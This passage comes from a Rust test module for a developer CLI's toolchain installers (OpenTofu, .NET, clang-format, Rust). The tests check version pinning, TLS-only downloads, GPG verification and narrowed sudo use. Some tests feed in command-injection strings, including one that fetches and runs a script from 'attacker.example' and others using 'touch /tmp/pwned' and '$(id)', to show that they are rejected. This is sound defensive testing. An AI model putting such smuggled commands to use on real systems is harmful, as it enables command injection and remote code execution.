        assert!(!script.contains("--skip-verify"));
        assert!(!script.contains("install-opentofu.sh"));
    }

    #[test]
    fn install_tofu_linux_uses_named_pin_not_caller_requirement() {
        let steps = install_tofu("latest", "linux");
        let script = &steps[0].args[1];

        assert!(
            script.contains(&format!("tofu_{OPENTOFU_VERSION}_linux_")),
            "the Linux installer must download the named OpenTofu pin"
        );
        assert!(!script.contains("tofu_latest_"));
    }

    #[test]
    fn tofu_definition_requires_pinned_minimum_version() {
        let tofu = tool_defs_formatters()
            .into_iter()
            .find(|definition| definition.name == "tofu")
            .expect("tofu definition must exist");
        let required = (tofu.read_req)();

        assert_eq!(required, OPENTOFU_VERSION);
        assert_eq!(
            (tofu.compare)("1.12.2", &required).0,
            ToolStatus::Warning,
            "an older installed OpenTofu version must be reported"
        );
        assert_eq!(
            (tofu.compare)("1.12.4", &required).0,
            ToolStatus::Ok,
            "a newer installed OpenTofu version must satisfy the minimum"
        );
    }

    #[test]
    fn install_tofu_unsupported_platform_is_empty() {
        assert!(install_tofu("", "windows").is_empty());
    }

    #[test]
    fn parse_tofu_version_extracts() {
        assert_eq!(
            parse_tofu_version("OpenTofu v1.10.2\non darwin_arm64"),
            "1.10.2"
        );
    }

    #[test]
    fn install_dotnet_macos() {
        let steps = install_dotnet("10.0.204", "darwin");
        assert_eq!(steps[0].command, "brew");
        assert!(steps[0].args.contains(&"dotnet".to_string()));
    }

    #[test]
    fn install_dotnet_linux_uses_official_script_not_snap() {
        let steps = install_dotnet("10.0.204", "linux");
        let script = &steps[0].args[1];

        assert_eq!(steps[0].command, "bash");
        assert!(
            script.contains("dot.net/v1/dotnet-install.sh"),
            "must use Microsoft's official install script, which supports every channel"
        );
        assert!(
            !script.contains("snap"),
            "must not depend on the community-maintained dotnet-sdk snap, whose track \
             catalog lags behind current .NET releases (capped at 8.0 as of 2026-08)"
        );
        assert!(
            !script.contains("dotnet-sdk"),
            "must not reference the community snap package name"
        );
        assert!(
            !script.contains("| bash"),
            "the installer must be downloaded before it is executed"
        );
        assert!(
            script.contains("--proto '=https'") && script.contains("--tlsv1.2"),
            "the installer download must be HTTPS-only and require modern TLS"
        );
    }

    #[test]
    fn install_dotnet_linux_channel_derived_from_required_version() {
        let steps = install_dotnet("10.0.204", "linux");
        let script = &steps[0].args[1];

        assert!(
            script.contains("--channel 10.0"),
            "the install channel must track the required SDK's major.minor version, \
             not a value hardcoded independently of the configured requirement"
        );
    }

    #[test]
    fn install_dotnet_linux_falls_back_to_default_channel_when_req_empty() {
        let steps = install_dotnet("", "linux");
        let script = &steps[0].args[1];

        assert!(script.contains("--channel 10.0"));
    }

    #[test]
    fn install_dotnet_linux_rejects_shell_metacharacters_in_required_version() {
        let steps = install_dotnet("10.0; curl attacker.example/x | bash", "linux");
        let script = &steps[0].args[1];

        assert!(
            script.contains("--channel 10.0") && !script.contains("--channel 10.0;"),
            "a `sdk.version` carrying shell metacharacters must fall back to the safe \
             default channel rather than splicing the metacharacters into the script"
        );
        assert!(
            !script.contains("attacker.example"),
            "no substring of an untrusted `req` may reach the generated shell script"
        );
        assert!(
            !script.contains("curl attacker") && !script.contains("| bash\n"),
            "a metacharacter-bearing channel must never be spliced verbatim into the \
             `bash -c` script"
        );
    }

    #[test]
    fn install_dotnet_linux_narrows_root_privilege_to_directory_setup_and_symlink_only() {
        let steps = install_dotnet("10.0.204", "linux");
        let script = &steps[0].args[1];

        assert!(
            !script.contains("sudo bash \"$temp_dir/dotnet-install.sh\""),
            "the curl-downloaded dotnet-install.sh must NOT run entirely under sudo — only \
             its own `mkdir -p /usr/share/dotnet` needs root (because /usr/share is \
             root-owned on stock Debian/Ubuntu); escalating the whole third-party script \
             gives root to every write it makes, not just that one directory creation"
        );
        assert!(
            script.contains("bash \"$temp_dir/dotnet-install.sh\" --channel 10.0"),
            "dotnet-install.sh itself must run unprivileged once its install directory \
             exists and is writable — Microsoft's script performs a non-admin installation \
             by design"
        );
        assert!(
            script.contains("sudo mkdir -p /usr/share/dotnet")
                && script.contains("sudo chown \"$(id -u):$(id -g)\" /usr/share/dotnet"),
            "root privilege must be scoped to pre-creating and chowning the install \
             directory, run before the unprivileged install-script invocation, so the \
             install itself can write into it without sudo"
        );
        assert!(
            script.find("sudo mkdir -p /usr/share/dotnet").unwrap()
                < script.find("bash \"$temp_dir/dotnet-install.sh\"").unwrap(),
            "the privileged mkdir+chown step must run BEFORE the unprivileged install-script \
             invocation, or the script's own directory creation would still hit a \
             root-owned /usr/share"
        );
    }

    #[test]
    fn install_dotnet_linux_verifies_gpg_signature_before_running_install_script() {
        let steps = install_dotnet("10.0.204", "linux");
        let script = &steps[0].args[1];

        assert!(
            script.contains("https://dot.net/v1/dotnet-install.sig")
                && script.contains("https://dot.net/v1/dotnet-install.asc"),
            "must download both the detached signature and Microsoft's signing public key \
             alongside dotnet-install.sh itself"
        );
        assert!(
            script.contains(DOTNET_INSTALL_SH_GPG_FINGERPRINT),
            "must pin the expected signing key fingerprint rather than trusting whatever \
             key the .asc endpoint happens to serve at install time"
        );
        assert!(
            script.contains("gpg --batch --verify")
                && script
                    .contains(r#""$temp_dir/dotnet-install.sig" "$temp_dir/dotnet-install.sh""#),
            "must run `gpg --verify` against the downloaded script before executing it"
        );
        assert!(
            script.find("gpg --batch --verify").unwrap()
                < script.find("bash \"$temp_dir/dotnet-install.sh\"").unwrap(),
            "GPG verification must complete BEFORE the install script is executed, or a \
             tampered script could run before its signature is even checked"
        );
    }

    #[test]
    fn install_dotnet_linux_uses_pinned_tls_and_local_script_not_pipe_to_shell() {
        let steps = install_dotnet("10.0.204", "linux");
        let script = &steps[0].args[1];

        assert!(
            script.contains("--proto '=https' --tlsv1.2"),
            "the install script download must pin TLS, matching install_tofu's standard"
        );
        assert!(
            !script.contains("| bash"),
            "must not pipe the downloaded script directly into a shell; download to a \
             temp file and execute it as a separate step instead"
        );
    }

    #[test]
    fn dotnet_channel_rejects_non_numeric_segments() {
        for requirement in ["10.0;touch /tmp/pwned", "10.$(id)", "10..204"] {
            assert_eq!(dotnet_channel(requirement), DOTNET_DEFAULT_CHANNEL);
        }
    }

    #[test]
    fn install_clang_format_macos() {
        let steps = install_clang_format("", "darwin");
        assert_eq!(steps[0].command, "brew");
        assert!(steps[0].args.contains(&"clang-format".to_string()));
    }

    #[test]
    fn install_clang_format_linux() {
        let steps = install_clang_format("", "linux");
        assert_eq!(steps[0].command, "sudo");
        assert!(steps[0].args.contains(&"clang-format".to_string()));
    }

    /// Binds the Gherkin scenario "doctor compares rustc against the
    /// toolchain that builds"
    /// (specs/apps/rhino/behavior/rhino-cli/gherkin/system/doctor.feature).
    /// `doctor` must validate installed `rustc` against the exact pinned
    /// channel in `rust-toolchain.toml` — the toolchain that `cargo`
    /// actually builds with — rather than the MSRV floor in `Cargo.toml`.
    /// A pinned channel is not a floor you can exceed, so the comparator
    /// must be exact-equality, not `compare_gte`.
    #[test]
    fn rust_tool_compares_against_pinned_toolchain_channel_not_msrv_floor() {
        let rust = tool_defs_rust()
            .into_iter()
            .find(|d| d.name == "rust")
            .expect("rust definition must exist");

        assert_eq!(
            rust.source, "apps/rhino-cli/rust-toolchain.toml → channel",
            "doctor must report the pinned toolchain channel as the Rust \
             version source, not the Cargo.toml MSRV floor"
        );

        assert_eq!(
            (rust.compare)("1.94.0", "1.95.0").0,
            ToolStatus::Warning,
            "an installed rustc older than the pinned channel must be a mismatch"
        );
        assert_eq!(
            (rust.compare)("1.96.0", "1.95.0").0,
            ToolStatus::Warning,
            "an installed rustc NEWER than the pinned channel must ALSO be a \
             mismatch — a pinned channel is exact-match, not a floor \
             (this is what distinguishes it from compare_gte)"
        );
        assert_eq!(
            (rust.compare)("1.95.0", "1.95.0").0,
            ToolStatus::Ok,
            "an installed rustc matching the pinned channel exactly must pass"
        );
    }
}
